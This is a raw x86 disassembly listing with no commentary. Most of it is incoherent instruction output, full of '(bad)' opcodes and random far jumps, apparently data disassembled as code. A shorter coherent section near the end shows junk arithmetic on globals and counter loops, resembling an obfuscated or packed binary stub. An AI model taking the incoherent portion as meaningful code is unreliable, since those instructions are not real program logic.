  4031b0:	xchg   edx,eax
  4031b1:	call   0x9ea1:0xeedc73e4
  4031b8:	sbb    al,0x4d
  4031ba:	repnz imul ebx,DWORD PTR [edx+0x6c],0xffffff90
  4031bf:	ss pop edx
  4031c1:	mov    bh,0xc
  4031c3:	std    
  4031c4:	aad    0x6c
  4031c6:	mov    ecx,0x42c00144
  4031cb:	mov    WORD PTR [ebx],?
  4031cd:	or     al,0xcf
  4031cf:	inc    BYTE PTR [edx]
  4031d1:	loopne 0x4031d9
  4031d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031d4:	mov    dl,BYTE PTR [ecx]
  4031d6:	jne    0x40318d
  4031d8:	js     0x40320c
  4031da:	push   ebx
  4031db:	push   ecx
  4031dc:	loopne 0x40318f
  4031de:	inc    eax
  4031df:	mov    dh,0xb4
  4031e1:	fwait
  4031e2:	gs mov bh,0x25
  4031e5:	stos   BYTE PTR es:[edi],al
  4031e6:	fdiv   st(6),st
  4031e8:	fmul   QWORD PTR [esi]
  4031ea:	mov    ecx,0xd1e328e3
  4031ef:	or     BYTE PTR [ecx+edx*8],ch
  4031f2:	sbb    al,0xef
  4031f4:	jmp    0x6a60:0xa9da3c9d
  4031fb:	xchg   ecx,eax
  4031fc:	ret    0x2fc0
  4031ff:	and    al,BYTE PTR [ebx]
  403201:	sbb    al,0xdb
  403203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403204:	push   esp
  403205:	ins    BYTE PTR es:[edi],dx
  403206:	jl     0x403275
  403208:	(bad)  
  40320a:	sti    
  40320b:	xchg   ebp,eax
  40320c:	adc    BYTE PTR [edx+0x57],dl
  40320f:	ja     0x4031fc
  403211:	out    0x33,eax
  403213:	push   ds
  403214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403215:	jnp    0x40325e
  403217:	add    esp,DWORD PTR [edx+edx*2]
  40321a:	fsubr  QWORD PTR [edx-0x49]
  40321d:	pop    esi
  40321e:	add    al,0x78
  403220:	fwait
  403221:	add    ebx,ecx
  403223:	(bad)  
  403224:	fidivr WORD PTR [esi-0x73]
  403227:	push   cs
  403228:	or     al,0x70
  40322a:	jmp    0x403293
  40322c:	les    edi,FWORD PTR [eax-0x42828c72]
  403232:	popf   
  403233:	and    ebx,edi
  403235:	ss sbb al,0x30
  403238:	jne    0x4031e1
  40323a:	addr16 mov ch,0x4
  40323d:	imul   ebx,DWORD PTR [edx+0x74],0xb
  403241:	mov    cl,0xe6
  403243:	js     0x40324e
  403245:	rcl    BYTE PTR [eax+esi*1-0x36],1
  403249:	push   0xd26638c1
  40324e:	push   cs
  40324f:	push   0x7b654581
  403254:	cld    
  403255:	jnp    0x4032c5
  403257:	outs   dx,DWORD PTR ds:[esi]
  403258:	sub    eax,0x1e525153
  40325d:	jmp    0x9aa0:0xe2f35b22
  403264:	adc    eax,0x78d2f9d9
  403269:	cs fcmovu st,st(4)
  40326c:	(bad)  
  40326d:	adc    eax,0x78301e3
  403272:	mov    esp,0x21fafcff
  403277:	inc    eax
  403278:	adc    BYTE PTR [eax],cl
  40327a:	or     ebp,edx
  40327c:	and    edx,DWORD PTR [ecx+esi*8]
  40327f:	xor    eax,0x9069b800
  403284:	adc    BYTE PTR [edi-0x29],ch
  403287:	dec    edx
  403288:	jmp    0x4032e5
  40328a:	adc    eax,0x4f15aedf
  40328f:	stos   DWORD PTR es:[edi],eax
  403290:	xor    BYTE PTR [eax-0x4aeb6295],dl
  403296:	fisubr DWORD PTR [esi-0x69914146]
  40329c:	rol    BYTE PTR [ecx+edx*4-0x50],1
  4032a0:	xchg   ecx,eax
  4032a1:	xchg   esp,esp
  4032a3:	fnsave ds:[ecx-0x14bbb45c]
  4032aa:	icebp  
  4032ab:	lea    ecx,[edx]
  4032ad:	jmp    0xa84cf37c
  4032b2:	pop    ebp
  4032b3:	xchg   ebx,eax
  4032b4:	and    ebx,ebx
  4032b6:	retf   
  4032b7:	dec    ebx
  4032b8:	xor    eax,0xd5d3fafb
  4032bd:	mov    al,0x18
  4032bf:	push   es
  4032c0:	lea    ebx,[edi+0x714c3581]
  4032c6:	mov    WORD PTR [ecx+0x23],?
  4032c9:	xor    BYTE PTR [esi+ebx*8],ch
  4032cc:	jb     0x403307
  4032ce:	out    dx,al
  4032cf:	daa    
  4032d0:	jo     0x403297
  4032d2:	inc    esp
  4032d3:	xchg   DWORD PTR [ebx-0xafedc2f],edi
  4032d9:	mov    esp,0xbfa0beda
  4032de:	pushf  
  4032df:	add    al,0x4e
  4032e1:	loopne 0x40333e
  4032e3:	addr16 int 0xe6
  4032e6:	test   BYTE PTR [eax-0x78],dh
  4032e9:	in     al,0x68
  4032eb:	jge    0x4032a4
  4032ed:	icebp  
  4032ee:	outs   dx,DWORD PTR ds:[esi]
  4032ef:	je     0x4032f9
  4032f1:	pop    eax
  4032f2:	ret    
  4032f3:	mov    ecx,DWORD PTR [esi]
  4032f5:	xchg   esi,eax
  4032f6:	sbb    bh,BYTE PTR [ecx+0x2e]
  4032f9:	scas   eax,DWORD PTR es:[edi]
  4032fa:	jo     0x403292
  4032fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032fd:	std    
  4032fe:	inc    edi
  4032ff:	push   es
  403300:	push   edx
  403301:	sub    DWORD PTR [edi],esi
  403303:	cmc    
  403304:	cwde   
  403305:	push   ds
  403306:	inc    esp
  403307:	out    dx,eax
  403308:	cmp    dl,BYTE PTR ds:0xf8613f7e
  40330e:	xchg   ebx,eax
  40330f:	mov    dh,0xb
  403311:	pop    ebp
  403312:	push   es
  403313:	loopne 0x4032de
  403315:	xchg   ecx,eax
  403317:	cmp    BYTE PTR [ebp-0x70c2e527],dh
  40331d:	test   eax,0x56482c90
  403322:	loop   0x403310
  403324:	push   ecx
  403325:	push   edx
  403326:	mov    ebp,0xd7ea3337
  40332b:	push   ss
  40332c:	and    dl,bl
  40332e:	or     eax,0xc79646e9
  403333:	imul   ebp,DWORD PTR [esi+0x37bdc2e],0xffffffb9
  40333a:	mov    eax,0xf3c062ce
  40333f:	push   cs
  403340:	jne    0x403354
  403342:	ret    
  403343:	push   eax
  403344:	call   0xc94b3739
  403349:	mov    WORD PTR [ebx+0x4b712bc0],?
  40334f:	idiv   BYTE PTR [ebx+edi*8]
  403352:	fidiv  DWORD PTR [ecx-0x23b5a091]
  403358:	aaa    
  403359:	pop    eax
  40335a:	sar    DWORD PTR [ebx],0x56
  40335d:	xchg   ebx,eax
  40335e:	shl    DWORD PTR [ebx-0x42],0xc5
  403362:	mov    DWORD PTR [edx+edi*8],esp
  403365:	test   eax,0xb2351508
  40336a:	add    eax,0xada1f273
  40336f:	jle    0x4033ea
  403371:	lea    esp,[eax-0x4]
  403374:	mov    bh,0xc4
  403376:	repnz mov bl,0xe1
  403379:	shl    esp,cl
  40337b:	xchg   ecx,eax
  40337c:	mov    dh,0x75
  40337e:	les    esp,FWORD PTR [ecx+esi*1]
  403381:	sub    DWORD PTR [eax+ecx*8],esi
  403384:	mov    BYTE PTR [edx-0x24ca1850],ch
  40338a:	pop    edi
  40338b:	lds    edx,FWORD PTR [edx+0x68630a6a]
  403391:	call   0xcf29:0xadb48f27
  403398:	icebp  
  403399:	or     edi,DWORD PTR [esi+0x15806863]
  40339f:	jmp    0x15442ea9
  4033a4:	std    
  4033a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033a6:	test   al,0x55
  4033a8:	pop    es
  4033a9:	(bad)  
  4033aa:	out    dx,al
  4033ab:	and    ch,BYTE PTR [esi]
  4033ad:	mov    cl,0xc6
  4033af:	jecxz  0x403416
  4033b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033b2:	xor    esi,ecx
  4033b4:	sbb    eax,0xd3fc2695
  4033b9:	mov    al,BYTE PTR [eax+0x8]
  4033bc:	xchg   esp,eax
  4033bd:	pusha  
  4033be:	mov    ah,0x37
  4033c0:	mov    eax,ds:0x6627b53c
  4033c5:	jge    0x403420
  4033c7:	adc    BYTE PTR [eax],cl
  4033c9:	sbb    al,0x60
  4033cb:	aad    0xe
  4033cd:	xor    BYTE PTR [ebx-0x6d],dl
  4033d0:	lds    edx,FWORD PTR [esi+0x4a6c9d99]
  4033d6:	and    ebp,DWORD PTR [ecx-0x80]
  4033d9:	or     eax,0x124ab77e
  4033de:	mov    dl,0xf2
  4033e0:	loop   0x403387
  4033e2:	out    dx,eax
  4033e3:	sbb    eax,0x6dbc6e05
  4033e8:	loopne 0x403424
  4033ea:	jbe    0x4033d5
  4033ec:	ret    
  4033ed:	data16 jg 0x40342d
  4033f0:	aam    0xe
  4033f2:	std    
  4033f3:	dec    esi
  4033f4:	rcl    BYTE PTR [esi+0x43],0x8c
  4033f8:	imul   esp,DWORD PTR [ebx+ecx*1],0x5a
  4033fc:	or     BYTE PTR [eax+0x1f],0xd
  403400:	jmp    DWORD PTR [ebp+0x33]
  403403:	ins    DWORD PTR es:[edi],dx
  403404:	imul   eax,DWORD PTR [ebp+edi*2-0xf],0xd8c21808
  40340c:	mov    esp,0xd035f768
  403411:	js     0x403483
  403413:	es lock in al,dx
  403416:	xchg   esi,eax
  403417:	fs inc ebp
  403419:	sub    bh,BYTE PTR [edi-0x6c]
  40341c:	daa    
  40341d:	jno    0x403477
  40341f:	sbb    DWORD PTR [ebp+0x11fc25c4],0x43
  403426:	push   ebp
  403427:	lahf   
  403428:	sar    ebx,0xed
  40342b:	pop    edi
  40342c:	pop    ebp
  40342d:	push   0xfe338e99
  403432:	gs icebp 
  403434:	aad    0x2
  403436:	jbe    0x403489
  403438:	jp     0x4033d8
  40343a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40343b:	into   
  40343c:	sahf   
  40343d:	jnp    0x4033db
  40343f:	mov    ebp,0xca2ec523
  403444:	mov    esp,0x9260b4a9
  403449:	adc    al,0xf8
  40344b:	test   eax,0x237fd488
  403450:	jne    0x403423
  403452:	jg     0x40340c
  403454:	sti    
  403455:	rcl    BYTE PTR fs:[edi],0x34
  403459:	add    dl,BYTE PTR [ecx+0x32]
  40345c:	cmp    bh,BYTE PTR [ecx+ecx*1-0x399ff902]
  403463:	ret    0x76ec
  403466:	inc    eax
  403467:	sub    al,0xd6
  403469:	mul    ebx
  40346b:	pop    esi
  40346c:	mov    ds:0x5aeb53e1,eax
  403471:	xchg   esi,eax
  403472:	xor    DWORD PTR [ebx+edi*4-0x45],eax
  403476:	daa    
  403477:	mov    esi,0x3268f34b
  40347c:	fs jmp 0xf07f:0xff6da628
  403484:	cmc    
  403485:	and    eax,0x7caba3f7
  40348a:	cli    
  40348b:	xchg   edx,eax
  40348c:	inc    ebp
  40348d:	(bad)  
  40348e:	icebp  
  40348f:	inc    ecx
  403490:	dec    ecx
  403491:	mov    cl,0x60
  403493:	push   ebx
  403494:	jo     0x403452
  403496:	je     0x4034c3
  403498:	arpl   WORD PTR [edi],si
  40349a:	aam    0x7
  40349c:	lods   al,BYTE PTR ds:[esi]
  40349d:	sub    esp,ecx
  40349f:	inc    esi
  4034a0:	iret   
  4034a1:	in     al,dx
  4034a2:	js     0x40342a
  4034a4:	dec    eax
  4034a5:	dec    esp
  4034a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034a7:	mov    WORD PTR [ecx-0x10],gs
  4034aa:	fidivr WORD PTR [ebp+edx*8-0x65]
  4034ae:	test   BYTE PTR [ebx+0x2b0ecc9e],ch
  4034b4:	push   esp
  4034b5:	jmp    0x403474
  4034b7:	fsub   QWORD PTR [edi+0x2d]
  4034ba:	xchg   esi,eax
  4034bb:	std    
  4034bc:	jl     0x4034b8
  4034be:	and    al,0xfa
  4034c0:	pop    edx
  4034c1:	fcom   QWORD PTR [edx]
  4034c3:	sbb    ah,BYTE PTR [edx+0x5e7d7362]
  4034c9:	xchg   BYTE PTR [edx-0x6],ah
  4034cc:	gs ror dl,cl
  4034cf:	repnz aam 0xce
  4034d2:	test   cl,0x28
  4034d5:	loope  0x4034ea
  4034d7:	mov    ebp,0x39943a54
  4034dc:	data16 cld 
  4034de:	sbb    edx,DWORD PTR [ecx+0x6f]
  4034e1:	cs ret 
  4034e3:	jb     0x403523
  4034e5:	mov    al,0xfa
  4034e7:	dec    eax
  4034e8:	inc    BYTE PTR [ebp-0x77]
  4034eb:	outs   dx,DWORD PTR ds:[esi]
  4034ec:	push   ds
  4034ed:	xlat   BYTE PTR ds:[ebx]
  4034ee:	sti    
  4034ef:	daa    
  4034f0:	cmc    
  4034f1:	shr    BYTE PTR [esi+0x3cec2d6c],0x78
  4034f8:	lods   al,BYTE PTR ds:[esi]
  4034f9:	push   edi
  4034fa:	sbb    bh,dh
  4034fc:	jmp    0xaeefc354
  403501:	dec    edi
  403502:	sbb    DWORD PTR [edi+eax*1+0x52],edx
  403506:	test   eax,esp
  403508:	mov    dh,BYTE PTR [edi+0x37]
  40350b:	sbb    eax,0xbf9ec0ad
  403510:	ret    
  403511:	data16 (bad) 
  403513:	sbb    DWORD PTR [esp+esi*8-0x3b],esi
  403517:	and    eax,DWORD PTR [ecx+ebx*1-0x26]
  40351b:	or     BYTE PTR [ebp+0x2f],cl
  40351e:	xor    DWORD PTR [eax+eiz*2-0x1b],eax
  403522:	inc    eax
  403523:	and    bl,BYTE PTR [esi+ecx*8+0x4ef790a2]
  40352a:	inc    edx
  40352b:	push   edi
  40352c:	cmp    dl,BYTE PTR [edi]
  40352e:	cwde   
  40352f:	nop
  403530:	(bad)  
  403531:	cs mov ah,0xcf
  403534:	cld    
  403535:	js     0x4034cb
  403537:	jns    0x4034f5
  403539:	inc    ecx
  40353a:	retf   0x83fa
  40353d:	popa   
  40353e:	ret    
  40353f:	push   es
  403540:	mov    ebx,0x8a0bd5f6
  403545:	xchg   ebp,eax
  403546:	aas    
  403547:	pop    ss
  403548:	inc    edx
  403549:	cs adc BYTE PTR gs:[edx],0xbf
  40354e:	xchg   edx,eax
  40354f:	mov    eax,0x23553fd4
  403554:	daa    
  403555:	imul   eax,DWORD PTR [ebx],0x71fb61fb
  40355b:	inc    ebp
  40355c:	mov    ebp,0xeb0db58
  403561:	rcr    DWORD PTR [eax+eax*2+0x53],0x3f
  403566:	dec    edi
  403567:	test   DWORD PTR [esi+0x2ccf52cf],esi
  40356d:	out    0xe1,al
  40356f:	xchg   esi,eax
  403570:	sbb    bl,BYTE PTR [edx]
  403572:	mov    cl,0x8d
  403574:	test   bl,dl
  403576:	mov    ebp,0x297565b2
  40357b:	aad    0x4d
  40357d:	inc    edi
  40357e:	int    0x77
  403580:	arpl   WORD PTR [edi-0x200e3255],bx
  403586:	lock test eax,0xd15cb742
  40358c:	push   esp
  40358d:	inc    edi
  40358e:	bound  edx,QWORD PTR [ecx-0x69f07f89]
  403594:	push   ebx
  403595:	into   
  403596:	ficom  DWORD PTR [ebx-0x7d]
  403599:	icebp  
  40359a:	cmp    cl,BYTE PTR [esi-0x19]
  40359d:	add    al,BYTE PTR [edx-0x7c30fc2b]
  4035a3:	pop    eax
  4035a4:	(bad)  
  4035a5:	cmp    eax,0x54ddc2c8
  4035aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ab:	arpl   WORD PTR [ecx],ax
  4035ad:	mov    esi,0x8ee804a2
  4035b2:	xchg   edi,eax
  4035b3:	sahf   
  4035b4:	push   esi
  4035b5:	xchg   edx,eax
  4035b6:	mov    ebx,0x58cf2b89
  4035bb:	xor    DWORD PTR [esi],edx
  4035bd:	cmp    BYTE PTR [ecx+eiz*1],0x30
  4035c1:	or     bh,bl
  4035c3:	inc    BYTE PTR [edx-0x737bafeb]
  4035c9:	push   esp
  4035ca:	or     al,0x8d
  4035cc:	jnp    0x4035e9
  4035ce:	push   eax
  4035cf:	cmp    BYTE PTR [esi-0x5410a1c3],ah
  4035d5:	or     BYTE PTR [esp+edx*2-0x63],ah
  4035d9:	pop    ss
  4035da:	mov    bl,0xcd
  4035dc:	pop    edi
  4035dd:	(bad)  
  4035de:	sub    dl,BYTE PTR [eax]
  4035e0:	ds dec edx
  4035e2:	imul   ebp,ecx,0xb363d7e5
  4035e8:	jge    0x40362f
  4035ea:	ss or  al,0x79
  4035ed:	and    ch,dl
  4035ef:	aad    0x73
  4035f1:	mov    ah,BYTE PTR [ebp+0x45]
  4035f4:	inc    eax
  4035f5:	out    dx,al
  4035f6:	stos   BYTE PTR es:[edi],al
  4035f7:	ins    DWORD PTR es:[edi],dx
  4035f8:	dec    edi
  4035f9:	lods   al,BYTE PTR ds:[esi]
  4035fa:	mov    eax,ds:0x8a49427e
  4035ff:	sbb    ch,dl
  403601:	jecxz  0x40367d
  403603:	lea    ebx,[eax-0x3c5e4dd8]
  403609:	mov    esp,0x4a7797c5
  40360e:	std    
  40360f:	ins    DWORD PTR es:[edi],dx
  403610:	adc    dh,BYTE PTR [edx-0x11]
  403613:	cmp    edi,eax
  403615:	cwde   
  403616:	lahf   
  403617:	ja     0x40360f
  403619:	push   ecx
  40361a:	xchg   DWORD PTR [eax+0x13],esp
  40361d:	dec    ebp
  40361e:	aam    0xeb
  403620:	lea    ecx,[ecx+ecx*4+0x55274706]
  403627:	xor    eax,0xaeb7ae37
  40362c:	cmp    eax,0x416ec82c
  403631:	fsub   QWORD PTR [ebx+0xd]
  403634:	aad    0xfb
  403636:	xor    ebp,ebx
  403638:	sub    al,0xbe
  40363a:	mov    edi,0xed75e171
  40363f:	cmp    eax,0xa1a2c591
  403644:	out    dx,eax
  403645:	jns    0x4035f5
  403647:	popa   
  403648:	and    DWORD PTR [ebx-0x5c],edi
  40364b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40364c:	push   ds
  40364d:	stos   BYTE PTR es:[edi],al
  40364e:	scas   eax,DWORD PTR es:[edi]
  40364f:	push   esi
  403650:	sbb    eax,0x796f9549
  403655:	sbb    BYTE PTR [edx+0x339ca38f],bh
  40365b:	test   BYTE PTR ds:0x39dabc3d,al
  403661:	xchg   BYTE PTR ds:0x7ded953e,ah
  403667:	dec    DWORD PTR [edx-0x5265a1e1]
  40366d:	pop    es
  40366e:	xlat   BYTE PTR ds:[ebx]
  40366f:	mov    ds:0x3b5020f9,al
  403674:	xchg   ch,bl
  403676:	mov    BYTE PTR [edi-0x259e75fe],ah
  40367c:	xchg   ebp,eax
  40367d:	add    eax,0xf88bcccf
  403682:	js     0x4036b3
  403684:	mov    BYTE PTR [ebx],0xf5
  403687:	cmp    eax,0xd4325b92
  40368c:	sbb    ah,ch
  40368e:	pop    esp
  40368f:	mov    ds:0x7a1ce292,al
  403694:	mov    dl,0xf6
  403696:	mov    edi,DWORD PTR [esi-0x5c]
  403699:	xchg   ebx,eax
  40369a:	mov    esp,0xa0118713
  40369f:	enter  0xac2d,0xf8
  4036a3:	adc    BYTE PTR [edx-0x1a],bl
  4036a6:	repnz scas al,BYTE PTR es:[edi]
  4036a8:	xchg   ebp,eax
  4036a9:	fistp  QWORD PTR [eax+0x5da541c6]
  4036af:	call   0x36be0cc8
  4036b4:	leave  
  4036b5:	shr    BYTE PTR [edi+edx*2],0x79
  4036b9:	push   cs
  4036ba:	xor    dh,BYTE PTR [edi+0x1fe70a7c]
  4036c0:	cmp    BYTE PTR [eax],dh
  4036c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036c3:	pop    esp
  4036c4:	popa   
  4036c5:	cmp    DWORD PTR [ecx+0x2f665694],edx
  4036cb:	cmp    al,0x82
  4036cd:	mov    ecx,0xe5bf7fb7
  4036d2:	js     0x403661
  4036d4:	rol    DWORD PTR [esp+esi*2-0x73],cl
  4036d8:	jbe    0x4036bb
  4036da:	ficomp WORD PTR [edi-0x389f9ba0]
  4036e0:	outs   dx,BYTE PTR ss:[esi]
  4036e2:	push   edx
  4036e3:	out    dx,al
  4036e4:	push   0xffffffd3
  4036e6:	xlat   BYTE PTR ds:[ebx]
  4036e7:	xchg   esi,eax
  4036e8:	lds    ecx,FWORD PTR [ebp-0x56ef89b8]
  4036ee:	gs sub al,0x1f
  4036f1:	adc    eax,0x4975c391
  4036f6:	or     BYTE PTR [ebp+0x63b9e1bd],ah
  4036fc:	call   0xc5b6:0x7ac69025
  403703:	arpl   WORD PTR ds:0x3e54c1e9,bp
  403709:	jnp    0x403758
  40370b:	ja     0x4036cc
  40370d:	or     ebp,DWORD PTR [esi]
  40370f:	in     eax,0x52
  403711:	fdivr  QWORD PTR [edx-0x7e57bb4f]
  403717:	lea    ebx,[esi-0x75346aca]
  40371d:	das    
  40371e:	or     al,0x3
  403720:	in     al,dx
  403721:	imul   ebp,DWORD PTR [eax-0x11],0x5d
  403725:	push   ebx
  403726:	adc    edi,esi
  403728:	ins    DWORD PTR es:[edi],dx
  403729:	mov    esp,0xe07047e4
  40372e:	iret   
  40372f:	mov    BYTE PTR [eax],ah
  403731:	clc    
  403732:	ins    BYTE PTR es:[edi],dx
  403733:	stos   BYTE PTR es:[edi],al
  403734:	sbb    ebp,0xeceadc8e
  40373a:	cmp    bh,ah
  40373c:	fcomp  QWORD PTR [ecx-0x2609a652]
  403742:	mov    esi,0x54917837
  403747:	call   0xa28413c7
  40374c:	and    ebx,edx
  40374e:	out    dx,eax
  40374f:	fidiv  DWORD PTR [edx-0x71]
  403752:	mov    ds,WORD PTR [ebx]
  403754:	mov    ch,BYTE PTR [eax]
  403756:	and    ch,BYTE PTR [ebp+0x3c]
  403759:	sbb    BYTE PTR [esp+ecx*8],bl
  40375c:	cdq    
  40375d:	push   edx
  40375e:	nop
  40375f:	push   ebx
  403760:	cmp    ebx,DWORD PTR [esi+0x70114c1b]
  403766:	sbb    DWORD PTR [ebp+0x1689e86],0x9c7952d0
  403770:	mov    ecx,0xfdfa56f6
  403775:	outs   dx,BYTE PTR ds:[esi]
  403777:	push   edx
  403778:	cli    
  403779:	daa    
  40377a:	popf   
  40377b:	xlat   BYTE PTR ds:[ebx]
  40377c:	popa   
  40377d:	dec    ebx
  40377e:	loope  0x40373f
  403780:	push   ebp
  403781:	aad    0x28
  403783:	pop    edi
  403784:	sbb    DWORD PTR [esp+eiz*2+0x1a4c0043],0x17
  40378c:	push   ss
  40378d:	ffree  st(3)
  40378f:	imul   edi,ecx,0xe
  403792:	mov    eax,0x92e4d54
  403797:	cdq    
  403798:	scas   al,BYTE PTR es:[edi]
  403799:	cld    
  40379a:	mov    eax,0xb394fc67
  40379f:	bound  ecx,QWORD PTR ds:0xd8a94f77
  4037a5:	in     al,dx
  4037a6:	ror    BYTE PTR [esi+0x1d],cl
  4037a9:	fnstcw WORD PTR [ebx-0x78ebd76f]
  4037af:	data16 jle 0x403769
  4037b2:	ds jle 0x4037fa
  4037b5:	out    dx,al
  4037b6:	lahf   
  4037b7:	push   0xffffffd8
  4037b9:	mov    ecx,0xbc018a96
  4037be:	sahf   
  4037bf:	fs cmp al,0x5e
  4037c2:	pop    ebp
  4037c3:	pop    ss
  4037c4:	retf   
  4037c5:	mov    ah,BYTE PTR [ebp+ebp*1+0x4231940]
  4037cc:	fist   WORD PTR [edi]
  4037ce:	and    BYTE PTR ds:0x8be8811f,dh
  4037d4:	nop
  4037d5:	aam    0xe1
  4037d7:	in     eax,0x49
  4037d9:	jp     0x403777
  4037db:	push   ecx
  4037dc:	adc    DWORD PTR cs:[esi],0x4a
  4037e0:	stos   DWORD PTR es:[edi],eax
  4037e1:	xchg   edx,eax
  4037e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037e3:	inc    esi
  4037e4:	sahf   
  4037e5:	mov    ss,WORD PTR [esi-0x538b5775]
  4037eb:	mov    ah,0x1
  4037ed:	pop    ss
  4037ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037ef:	xor    al,BYTE PTR [edx]
  4037f1:	or     eax,0xdf965b97
  4037f6:	loop   0x403863
  4037f8:	(bad)  
  4037f9:	lock iret 
  4037fb:	sub    bl,BYTE PTR [edi]
  4037fd:	loope  0x403805
  4037ff:	and    al,0xae
  403801:	cwde   
  403802:	and    eax,0xc4b3ed1e
  403807:	sub    al,0xc2
  403809:	push   ebx
  40380a:	and    eax,0xdbc5da79
  40380f:	mov    ds:0x72c4e5bb,al
  403814:	adc    eax,0xffa7042f
  403819:	cmp    BYTE PTR [ebx],ah
  40381b:	jecxz  0x4037a1
  40381d:	add    BYTE PTR [edi-0x189451c6],dl
  403823:	sbb    dl,BYTE PTR [ebp-0x8]
  403826:	push   eax
  403827:	push   ecx
  403828:	ins    DWORD PTR es:[edi],dx
  403829:	mov    cl,0xfd
  40382b:	add    al,0xf2
  40382d:	sar    esi,1
  40382f:	mov    cl,0x9a
  403831:	jae    0x4037cb
  403833:	lods   eax,DWORD PTR ds:[esi]
  403834:	cdq    
  403835:	repz add edi,DWORD PTR [ebx+0x157bd11b]
  40383c:	jnp    0x4037c9
  40383e:	jo     0x403892
  403840:	cmp    eax,0x3f06e9cc
  403845:	jo     0x4038c5
  403847:	jnp    0x403862
  403849:	repnz adc dh,cl
  40384c:	mov    eax,DWORD PTR [ecx]
  40384e:	aad    0x17
  403850:	mov    al,ds:0xa65fc9d3
  403855:	mov    dh,BYTE PTR [edi+0x5605f95]
  40385b:	mov    dh,0xb9
  40385d:	sub    DWORD PTR [edx+0x0],edi
  403860:	dec    edi
  403861:	push   ebx
  403862:	push   0x43b00509
  403867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403868:	dec    eax
  403869:	je     0x40386b
  40386b:	jno    0x403846
  40386d:	jge    0x4038a2
  40386f:	fcomp  QWORD PTR [ebp-0x7a0b7287]
  403875:	cs (bad) 
  403877:	rcr    ch,1
  403879:	cwde   
  40387a:	call   0xc0a0:0xf62439a3
  403881:	jg     0x4038a6
  403883:	jmp    0x40387a
  403885:	arpl   WORD PTR [ecx-0x14bfa8ef],ax
  40388b:	cmp    al,BYTE PTR [ecx]
  40388d:	psrlq  mm6,QWORD PTR ds:0x95ba3866
  403894:	imul   edx,esp,0x66f9a0e4
  40389a:	dec    ecx
  40389b:	adc    edx,DWORD PTR [ebp-0x32576245]
  4038a1:	sbb    BYTE PTR [edi+0x4f],bh
  4038a4:	test   DWORD PTR [esi-0x65],ebp
  4038a7:	fmul   st(0),st
  4038a9:	repnz mov eax,0x976e7774
  4038af:	stos   DWORD PTR es:[edi],eax
  4038b0:	in     al,dx
  4038b1:	mov    edi,0x1b67454e
  4038b6:	std    
  4038b7:	mov    bh,0x53
  4038b9:	and    DWORD PTR [edx-0x408d9342],ecx
  4038bf:	sub    eax,0x2c867bcb
  4038c4:	adc    eax,0x8fbd509b
  4038c9:	(bad)  
  4038ca:	cwde   
  4038cb:	mov    BYTE PTR [eax-0x473e379e],dh
  4038d1:	cwde   
  4038d2:	and    al,0x30
  4038d4:	mov    esp,0xf63a8f98
  4038d9:	scas   eax,DWORD PTR es:[edi]
  4038da:	jge    0x4038b3
  4038dc:	dec    eax
  4038dd:	add    ebp,edi
  4038df:	inc    ecx
  4038e0:	ret    
  4038e1:	out    dx,eax
  4038e2:	addr16 jp 0x4038ef
  4038e5:	cmp    BYTE PTR [ebp+0x6e7c2999],0x39
  4038ec:	aam    0xa3
  4038ee:	(bad)  
  4038f0:	fdivr  st(3),st
  4038f2:	or     DWORD PTR [edi-0x51],edx
  4038f5:	and    esi,edi
  4038f7:	ret    
  4038f8:	out    dx,eax
  4038f9:	add    DWORD PTR [esi+eiz*4-0x2eac86bb],ebx
  403900:	sti    
  403901:	es ret 
  403903:	mov    ecx,DWORD PTR [ebp-0x10]
  403906:	sub    DWORD PTR ds:0x426eb9,0x426ea1
  403910:	xor    eax,esi
  403912:	adc    DWORD PTR ds:0x426f2d,0x426f05
  40391c:	xor    ecx,esi
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x42fa44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
